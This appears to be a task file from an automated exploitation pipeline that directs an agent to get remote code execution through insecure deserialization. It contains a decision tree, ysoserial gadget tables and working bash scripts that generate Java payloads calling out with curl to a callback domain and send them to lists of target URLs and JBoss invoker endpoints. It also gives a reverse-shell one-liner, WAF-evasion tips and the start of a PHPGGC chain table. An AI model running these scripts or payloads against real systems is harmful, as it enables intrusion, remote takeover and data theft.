================================================================================
TASK 77 ¬∑ DESERIALIZATION EXPLOITATION & RCE
================================================================================
Covers testing_toolkit.txt Phase 9 Step 32 (Part 2)
Full exploitation using ysoserial, PHPGGC, Fickling, marshalsec.

OBJECTIVE:
- Exploit confirmed deserialization vulnerabilities
- Java gadget chain exploitation (ysoserial)
- PHP gadget chain exploitation (PHPGGC)
- Python pickle exploitation (Fickling)
- .NET ViewState exploitation (ysoserial.net)
- Fastjson/Jackson/XStream exploitation
- Achieve RCE or data exfiltration

================================================================================
INPUTS
================================================================================
temp/agent1/queue_deser_exploitation.txt   ‚Üê From Task 76
outputs/deser/java_deser_candidates.txt    ‚Üê Java targets
outputs/deser/php_deser_candidates.txt     ‚Üê PHP targets
outputs/deser/python_deser_candidates.txt  ‚Üê Python targets
outputs/deser/dotnet_deser_candidates.txt  ‚Üê .NET targets
outputs/deser/deser_confirmed.txt          ‚Üê Confirmed vulnerable
outputs/interactsh_id.txt                  ‚Üê OOB callback domain
outputs/nuclei/tech_stack.json             ‚Üê Tech detection

================================================================================
OUTPUTS
================================================================================
outputs/deser/
‚îú‚îÄ‚îÄ java_rce_confirmed.txt          ‚Üê Java RCE exploits
‚îú‚îÄ‚îÄ php_rce_confirmed.txt           ‚Üê PHP RCE exploits
‚îú‚îÄ‚îÄ python_rce_confirmed.txt        ‚Üê Python RCE exploits
‚îú‚îÄ‚îÄ dotnet_rce_confirmed.txt        ‚Üê .NET RCE exploits
‚îú‚îÄ‚îÄ json_deser_results.txt          ‚Üê JSON deserializer (Fastjson/Jackson)
‚îú‚îÄ‚îÄ gadget_chains_used.txt          ‚Üê Successful gadget documentation
‚îú‚îÄ‚îÄ shells_obtained.txt             ‚Üê Shell access details
‚îî‚îÄ‚îÄ exploitation_log.txt            ‚Üê Full exploitation log

================================================================================
üß† AGENT DECISION FRAMEWORK üß†
================================================================================

CRITICAL: This task is about EXPLOITATION. You have confirmed targets from Task 76.
Now you need to choose the RIGHT GADGET CHAIN for each target.

‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ EXPLOITATION DECISION TREE                                                  ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                                             ‚îÇ
‚îÇ  Target Technology (from Task 76 detection)?                                ‚îÇ
‚îÇ  ‚îÇ                                                                          ‚îÇ
‚îÇ  ‚îú‚îÄ JAVA Serialization Detected?                                           ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ Know which libraries? (from errors/fingerprinting)                 ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îú‚îÄ Commons Collections ‚Üí CC1-CC7 gadgets                          ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îú‚îÄ Spring Framework ‚Üí Spring1/Spring2                             ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îú‚îÄ Hibernate ‚Üí Hibernate1/Hibernate2                              ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îî‚îÄ Unknown libs ‚Üí Try URLDNS first (safe detection)               ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Don't know libraries?                                              ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Step 1: Use URLDNS (just DNS, no RCE)                          ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Step 2: Use GadgetProbe (fingerprint libraries)                ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Step 3: Try gadgets from most common ‚Üí least                   ‚îÇ
‚îÇ  ‚îÇ                                                                          ‚îÇ
‚îÇ  ‚îú‚îÄ PHP Serialization Detected?                                            ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ Laravel app? ‚Üí PHPGGC Laravel/RCE* chains                          ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ Symfony app? ‚Üí PHPGGC Symfony/RCE* chains                          ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ WordPress? ‚Üí PHPGGC WordPress/RCE* or Guzzle                       ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ Drupal? ‚Üí PHPGGC Drupal/RCE* chains                                ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ phar:// in file param? ‚Üí Create PHAR polyglot                      ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Unknown? ‚Üí Try Monolog, Guzzle (most common)                       ‚îÇ
‚îÇ  ‚îÇ                                                                          ‚îÇ
‚îÇ  ‚îú‚îÄ PYTHON Pickle Detected?                                                ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ Flask session cookie?                                              ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îî‚îÄ Need SECRET_KEY (check leaks, bruteforce)                      ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îî‚îÄ Use flask-unsign tool                                          ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ Direct pickle parameter?                                           ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Generate payload with os.system/subprocess                     ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Use Fickling for safe generation                               ‚îÇ
‚îÇ  ‚îÇ                                                                          ‚îÇ
‚îÇ  ‚îú‚îÄ .NET Detected?                                                         ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îú‚îÄ ViewState without MAC?                                             ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îî‚îÄ Use ysoserial.net TypeConfuseDelegate                          ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ   ‚îî‚îÄ Also try ObjectDataProvider                                    ‚îÇ
‚îÇ  ‚îÇ   ‚îÇ                                                                      ‚îÇ
‚îÇ  ‚îÇ   ‚îî‚îÄ JSON with $type?                                                   ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ Json.NET TypeNameHandling attack                               ‚îÇ
‚îÇ  ‚îÇ       ‚îî‚îÄ ObjectDataProvider gadget                                      ‚îÇ
‚îÇ  ‚îÇ                                                                          ‚îÇ
‚îÇ  ‚îî‚îÄ Node.js (node-serialize)?                                              ‚îÇ
‚îÇ      ‚îî‚îÄ _$$ND_FUNC$$_function(){...}() payload                            ‚îÇ
‚îÇ      ‚îî‚îÄ Immediate RCE                                                       ‚îÇ
‚îÇ                                                                             ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üéØ EXPLOITATION ORDER (Safe ‚Üí Dangerous)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1. DETECTION FIRST (no actual RCE)
   - URLDNS gadget (Java) - just DNS lookup
   - Sleep-based payloads - time delay
   
2. OOB CALLBACK (verify execution)
   - curl/wget to interactsh
   - nslookup to collaborator
   
3. FILE WRITE (less risky)
   - Write to /tmp/proof.txt
   - Write to web root
   
4. REVERSE SHELL (most valuable)
   - bash -i >& /dev/tcp/IP/PORT 0>&1
   - python/perl/php reverse shells

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚ö†Ô∏è  COMMON PITFALLS - THINK BEFORE ACTING
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚ñ° Wrong gadget = silent failure (try multiple!)
‚ñ° Payload too long? Some endpoints truncate
‚ñ° Base64 padding? + and / may need URL encoding
‚ñ° Firewalled? Try DNS exfil instead of HTTP
‚ñ° WAF blocking? Try encoding variations

================================================================================
üß† EXPLOITATION STRATEGY üß†
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Gadget Chain Selection
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
Different libraries on target = different gadget chains work

JAVA:
- Commons Collections 1-7 ‚Üí org.apache.commons.collections
- Spring1/2 ‚Üí Spring Framework
- Hibernate1/2 ‚Üí Hibernate ORM
- Jdk7u21 ‚Üí Raw JDK (no extra libs needed)
- URLDNS ‚Üí DNS lookup (detection only)

PHP:
- Laravel/RCE* ‚Üí Laravel framework
- Symfony/RCE* ‚Üí Symfony
- Guzzle/RCE* ‚Üí Guzzle HTTP client
- Monolog/RCE* ‚Üí Monolog logger
- Yii/RCE* ‚Üí Yii framework

PYTHON:
- os.system, subprocess, eval ‚Üí Standard library

.NET:
- TypeConfuseDelegate ‚Üí Most reliable
- TextFormattingRunProperties ‚Üí WPF apps
- ObjectDataProvider ‚Üí XAML

================================================================================
PHASE 1: JAVA EXPLOITATION WITH YSOSERIAL
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.1 Identify Available Libraries
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# Fingerprint target to identify which gadget chains may work

# Commons Collections indicators
# - JBoss, WebLogic, WebSphere often have CC
# - Look for: org.apache.commons.collections in errors

# Spring indicators
# - Spring Boot apps
# - /actuator endpoints

# Check tech stack
cat outputs/nuclei/tech_stack.json | jq -r '.technologies[]' 2>/dev/null

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.2 ysoserial Gadget Chain Reference
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
YSOSERIAL="java -jar temp/agent1/ysoserial.jar"

# List all gadgets
$YSOSERIAL 2>&1 | tail -50

# MOST RELIABLE GADGETS:
# ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
# ‚îÇ Gadget                  ‚îÇ Required Library                     ‚îÇ
# ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
# ‚îÇ CommonsCollections1-7   ‚îÇ commons-collections:3.1-3.2.1        ‚îÇ
# ‚îÇ CommonsCollections5     ‚îÇ commons-collections:3.1              ‚îÇ
# ‚îÇ CommonsCollections6     ‚îÇ commons-collections:3.1              ‚îÇ
# ‚îÇ CommonsBeanutils1       ‚îÇ commons-beanutils:1.9.2              ‚îÇ
# ‚îÇ Spring1                 ‚îÇ spring-core:4.1.4, spring-beans      ‚îÇ
# ‚îÇ Spring2                 ‚îÇ spring-core:4.1.4, spring-aop        ‚îÇ
# ‚îÇ Hibernate1/2            ‚îÇ hibernate-core                       ‚îÇ
# ‚îÇ Jdk7u21                 ‚îÇ None (JDK only)                      ‚îÇ
# ‚îÇ URLDNS                  ‚îÇ None (detection only)                ‚îÇ
# ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.3 Generate RCE Payloads
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# ysoserial_rce.sh

YSOSERIAL="java -jar temp/agent1/ysoserial.jar"
CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

mkdir -p temp/agent1/deser/java_payloads

# Payloads for each gadget
GADGETS=(
    "CommonsCollections1"
    "CommonsCollections2"
    "CommonsCollections3"
    "CommonsCollections4"
    "CommonsCollections5"
    "CommonsCollections6"
    "CommonsCollections7"
    "CommonsBeanutils1"
    "Spring1"
    "Spring2"
    "Hibernate1"
    "Hibernate2"
    "Jdk7u21"
    "BeanShell1"
    "Groovy1"
    "JRMPClient"
)

for gadget in "${GADGETS[@]}"; do
    echo "[*] Generating: $gadget"
    
    # OOB callback command
    cmd="curl https://${gadget}.${CALLBACK}/rce"
    
    # Generate payload
    $YSOSERIAL "$gadget" "$cmd" > "temp/agent1/deser/java_payloads/${gadget}.bin" 2>/dev/null
    
    if [ -s "temp/agent1/deser/java_payloads/${gadget}.bin" ]; then
        # Base64 encode
        base64 -w0 "temp/agent1/deser/java_payloads/${gadget}.bin" \
            > "temp/agent1/deser/java_payloads/${gadget}_b64.txt"
        echo "[+] Generated: $gadget"
    else
        rm -f "temp/agent1/deser/java_payloads/${gadget}.bin"
    fi
done

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.4 Exploit Java Targets
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# exploit_java_deser.sh

CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

echo "[*] Exploiting Java deserialization targets..."

while IFS='|' read -r url status type; do
    [ -z "$url" ] && continue
    [[ "$url" =~ ^# ]] && continue
    
    echo "[*] Target: $url"
    
    # Try each gadget chain
    for payload_file in temp/agent1/deser/java_payloads/*.bin; do
        [ -f "$payload_file" ] || continue
        
        gadget=$(basename "$payload_file" .bin)
        echo "  [*] Trying: $gadget"
        
        # Method 1: Raw binary POST
        curl -sk "$url" \
            -H "Content-Type: application/x-java-serialized-object" \
            --data-binary "@$payload_file" \
            --max-time 15 &>/dev/null
        
        # Method 2: Base64 in parameter
        b64_file="${payload_file%.bin}_b64.txt"
        if [ -f "$b64_file" ]; then
            payload_b64=$(cat "$b64_file")
            
            # Common parameter names
            for param in "data" "object" "payload" "state" "session"; do
                curl -sk "$url" \
                    -d "${param}=${payload_b64}" \
                    --max-time 15 &>/dev/null
            done
        fi
        
        # Small delay between attempts
        sleep 0.5
    done
    
    echo "$url|tested|all_gadgets" >> temp/agent1/deser/java_exploit_log.txt
    
done < outputs/deser/java_deser_candidates.txt

echo "[*] Check interactsh for callbacks: ${CALLBACK}"
echo "[*] Successful gadgets will show as: <gadget>.${CALLBACK}"

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
1.5 JBoss/JMX Specific Exploitation
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
#!/bin/bash
# jboss_exploit.sh

# JBoss JMXInvokerServlet is commonly vulnerable

YSOSERIAL="java -jar temp/agent1/ysoserial.jar"
CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")

JBOSS_ENDPOINTS=(
    "/invoker/JMXInvokerServlet"
    "/invoker/EJBInvokerServlet"
    "/jmx-console/HtmlAdaptor"
)

exploit_jboss() {
    local base_url="$1"
    
    for endpoint in "${JBOSS_ENDPOINTS[@]}"; do
        url="${base_url}${endpoint}"
        
        echo "[*] Testing JBoss endpoint: $url"
        
        # CommonsCollections variants work best on JBoss
        for ver in 1 2 3 4 5 6 7; do
            gadget="CommonsCollections${ver}"
            
            $YSOSERIAL "$gadget" "curl https://jboss-cc${ver}.${CALLBACK}/rce" 2>/dev/null | \
            curl -sk "$url" \
                -H "Content-Type: application/x-java-serialized-object" \
                --data-binary @- \
                --max-time 15
        done
    done
}

# Run on Java targets
grep -i jboss outputs/deser/java_deser_candidates.txt | \
while IFS='|' read -r url _; do
    exploit_jboss "$url"
done

================================================================================
PHASE 2: PHP EXPLOITATION WITH PHPGGC
================================================================================

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
2.1 PHPGGC Gadget Reference
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
PHPGGC="temp/agent1/phpggc/phpggc"

# List all chains
$PHPGGC -l

# ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
# ‚îÇ Chain                   ‚îÇ Target Framework/Library             ‚îÇ
# ‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
# ‚îÇ Guzzle/RCE1             ‚îÇ Guzzle HTTP Client                   ‚îÇ
# ‚îÇ Laravel/RCE1-16         ‚îÇ Laravel Framework                    ‚îÇ
# ‚îÇ Symfony/RCE1-4          ‚îÇ Symfony Framework                    ‚îÇ
# ‚îÇ Monolog/RCE1-3          ‚îÇ Monolog Logger                       ‚îÇ
# ‚îÇ Yii/RCE1-2              ‚îÇ Yii Framework                        ‚îÇ
# ‚îÇ ThinkPHP/RCE1-2         ‚îÇ ThinkPHP Framework                   ‚îÇ
# ‚îÇ Doctrine/RCE1-2         ‚îÇ Doctrine ORM                         ‚îÇ
# ‚îÇ WordPress/RCE1-2        ‚îÇ WordPress                            ‚îÇ
# ‚îÇ Magento/SQLI1           ‚îÇ Magento (SQL injection)              ‚îÇ
# ‚îÇ Slim/RCE1               ‚îÇ Slim Framework                       ‚îÇ
